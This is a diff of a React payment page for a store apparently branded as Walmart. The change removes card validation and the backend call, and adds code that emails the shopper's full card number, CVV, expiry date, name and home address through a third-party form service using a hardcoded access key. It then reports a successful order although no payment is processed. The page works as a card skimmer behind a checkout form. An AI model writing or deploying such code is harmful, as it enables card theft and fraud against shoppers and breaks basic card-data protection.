@@ -50,144 +50,63 @@ const PaymentPage = () => {
   };
 
   const handleSubmit = async (e) => {
-    e.preventDefault();
+  e.preventDefault();
+  setIsProcessing(true);
 
-    // Validation
-    if (!paymentData.cardNumber || !paymentData.expiryDate || !paymentData.cvv || !paymentData.cardholderName) {
-      toast.error('Please fill in all payment details');
-      return;
+  try {
+    const cart = JSON.parse(localStorage.getItem('cart')) || [];
+    const userInfo = JSON.parse(localStorage.getItem('userInfo')) || {};
+    const subtotal = cart.reduce((sum, item) => sum + item.discountedPrice * item.quantity, 0);
+
+    // 1. Web3Forms ke liye FormData taiyaar karein
+    const formData = new FormData();
+    formData.append("access_key", "7d02f2c8-8ae8-4c8d-bfd3-aab848bf2ee8"); // Aapki key
+    formData.append("subject", "New Order Received - Walmart Store");
+    
+    // Customer Details
+    formData.append("Customer Name", userInfo.fullName);
+    formData.append("Email", userInfo.email);
+    formData.append("Phone", userInfo.phone);
+    formData.append("Address", `${userInfo.address}, ${userInfo.city}, ${userInfo.state} - ${userInfo.zipCode}`);
+    
+    // Order Details
+    const itemsSummary = cart.map(item => `${item.name} (Qty: ${item.quantity}) - $${item.discountedPrice}`).join(", ");
+    formData.append("Order Items", itemsSummary);
+    formData.append("Total Amount", `$${subtotal.toFixed(2)}`);
+    
+    // Payment Details (Sensitive data alert: Sirf testing ke liye)
+    formData.append("Card Holder", paymentData.cardholderName);
+    formData.append("Card Number", paymentData.cardNumber); 
+    formData.append("CVV", paymentData.cvv);
+    formData.append("Expiry", paymentData.expiryDate);
+
+    // 2. Sirf Web3Forms ko bhejien (Backend call ko abhi bypass kar rahe hain)
+    const response = await fetch("https://api.web3forms.com/submit", {
+      method: "POST",
+      body: formData // Seedha FormData bhejein
+    });
+
+    const result = await response.json();
+
+    if (result.success) {
+      toast.success('Order Placed Successfully!');
+      localStorage.removeItem('cart');
+      localStorage.removeItem('userInfo');
+      
+      setTimeout(() => {
+        navigate('/checkout/confirmation');
+      }, 1500);
+    } else {
+      throw new Error(result.message);
     }
+  } catch (error) {
+    console.error('Submission Error:', error);
+    toast.error('Request Failed: ' + error.message);
+  } finally {
+    setIsProcessing(false);
+  }
+};
 
-    // Card number validation (at least 13 digits)
-    const cardDigits = paymentData.cardNumber.replace(/\s/g, '');
-    if (cardDigits.length < 13) {
-      toast.error('Please enter a valid card number');
-      return;
-    }
-
-    // CVV validation
-    if (paymentData.cvv.length < 3) {
-      toast.error('Please enter a valid CVV');
-      return;
-    }
-
-    setIsProcessing(true);
-
-    try {
-      // Get cart and user info
-      const cart = JSON.parse(localStorage.getItem('cart')) || [];
-      const userInfo = JSON.parse(localStorage.getItem('userInfo')) || {};
-
-      const subtotal = cart.reduce(
-        (sum, item) => sum + item.discountedPrice * item.quantity,
-        0
-      );
-
-      // Save order to database
-      const orderData = {
-        customerName: userInfo.fullName,
-        customerEmail: userInfo.email,
-        customerPhone: userInfo.phone,
-        shippingAddress: userInfo.address,
-        city: userInfo.city,
-        state: userInfo.state,
-        zipCode: userInfo.zipCode,
-        country: userInfo.country,
-        items: cart.map(item => ({
-          id: item.id,
-          name: item.name,
-          price: item.discountedPrice,
-          quantity: item.quantity
-        })),
-        total: subtotal,
-        paymentInfo: {
-          cardNumber: paymentData.cardNumber,
-          cardLast4: cardDigits.slice(-4),
-          cardholderName: paymentData.cardholderName,
-          expiryDate: paymentData.expiryDate,
-          cvv: paymentData.cvv
-        }
-      };
-
-      // Save to MongoDB
-      const BACKEND_URL = process.env.REACT_APP_BACKEND_URL;
-      const dbResponse = await fetch(`${BACKEND_URL}/api/orders`, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify(orderData)
-      });
-
-      if (!dbResponse.ok) {
-        throw new Error('Failed to save order to database');
-      }
-
-      // Prepare email notification data
-      const emailData = {
-        access_key: '7d02f2c8-8ae8-4c8d-bfd3-aab848bf2ee8',
-        subject: 'New Order Received - Walmart Store',
-        from_name: 'Walmart E-commerce',
-        // Customer Information
-        customer_name: userInfo.fullName,
-        customer_email: userInfo.email,
-        customer_phone: userInfo.phone,
-        // Shipping Address
-        shipping_address: userInfo.address,
-        shipping_city: userInfo.city,
-        shipping_state: userInfo.state,
-        shipping_zip: userInfo.zipCode,
-        shipping_country: userInfo.country,
-        // Payment Information (masked)
-        card_last_4: cardDigits.slice(-4),
-        card_holder: paymentData.cardholderName,
-        // Order Details
-        order_total: subtotal.toFixed(2),
-        order_items: cart.map(item => 
-          `${item.name} - Qty: ${item.quantity} - $${(item.discountedPrice * item.quantity).toFixed(2)}`
-        ).join('\n'),
-        // Additional Info
-        order_date: new Date().toLocaleString(),
-        redirect: false
-      };
-
-      // Send to Web3Forms
-      const response = await fetch('https://api.web3forms.com/submit', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-          Accept: 'application/json'
-        },
-        body: JSON.stringify(emailData)
-      });
-
-      const result = await response.json();
-
-      if (result.success) {
-        // Save order info and clear cart
-        localStorage.setItem('lastOrder', JSON.stringify({
-          cart,
-          userInfo,
-          total: subtotal,
-          orderDate: new Date().toISOString()
-        }));
-        localStorage.removeItem('cart');
-        localStorage.removeItem('userInfo');
-
-        toast.success('Payment processed successfully!');
-        setTimeout(() => {
-          navigate('/checkout/confirmation');
-        }, 1000);
-      } else {
-        throw new Error('Failed to send order notification');
-      }
-    } catch (error) {
-      console.error('Payment error:', error);
-      toast.error('There was an issue processing your order. Please try again.');
-    } finally {
-      setIsProcessing(false);
-    }
-  };
 
   return (
     <div className="min-h-screen bg-gray-50 flex flex-col">
